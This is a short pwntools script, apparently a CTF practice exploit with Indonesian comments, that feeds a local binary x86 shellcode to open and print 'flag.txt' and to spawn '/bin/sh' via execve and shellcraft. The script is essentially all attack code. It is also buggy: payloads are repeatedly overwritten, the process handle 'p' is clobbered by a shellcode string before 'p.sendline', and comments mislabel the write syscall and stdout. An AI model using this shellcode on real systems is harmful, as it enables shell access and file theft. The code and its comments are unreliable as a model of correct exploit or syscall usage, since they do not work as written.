#!/usr/bin/python2
from pwn import *

p = process('./exp2')

# payload = '''
# mov eax,1
# mov ebx,10
# int 0x80
# ''' 
#ini exit
payload = '''
mov eax, 3 #manggil read
mov ebx, 0 #manggil stdin
lea ecx, [esp+0x100] #kalkulasi value ke esp
mov edx, 100 #untuk seberapa banyak input
int 0x80 #syscalls
''' #stdin
#open
payload = '''
mov eax, 5 #read itu 5
push 0 #string tu null byte makanya pake ini
push 0x7478742e #hex dari .txt
push 0x67616c66 #hex dari flag
mov ebx, esp #inisiasi value ebx ke esp
mov ecx, 0 #permission readonly tu 0x00000
mov edx, 0 #ini dikosongin aja
int 0x80 #syscalls
'''

#read untuk file
payload = '''
mov ebx, eax
mov eax, 3 #fd nya 3 kita liat di gdb
lea ecx, [esp+0x100] #kalkulasi value ke esp
mov edx, 100 #untuk seberapa banyak input
int 0x80 #syscalls
'''
#read
payload = '''
mov eax, 4 #manggil read
mov ebx, 1 #manggil stdin
lea ecx, [esp+0x100] #kalkulasi value ke esp
mov edx, 100 #untuk seberapa banyak input
int 0x80 #syscalls
''' #stdout

#write
payload = '''
mov edx, eax #soalnya inputan itu tidak tentu
mov eax, 4 #manggil read
mov ebx, 1 #manggil stdin
lea ecx, [esp+0x100] #kalkulasi value ke esp
int 0x80 #syscalls
''' #stdout

#bin sh
import struct

fn = [b"/bin", b"//sh"]
for i in range(len(fn)):
    fn[i] = struct.unpack("I", fn[i])[0]

p = """
mov eax, 0xb
push 0
push {}
push {}
mov ebx, esp
mov ecx, 0
mov edx, 0
int 0x80
""".format(fn[1], fn[0])

#bin sh
p = shellcraft.execve("/bin/sh",0,0)
p = shellcraft.sh()

payload = asm(payload)
p.sendline(payload)
p.interactive()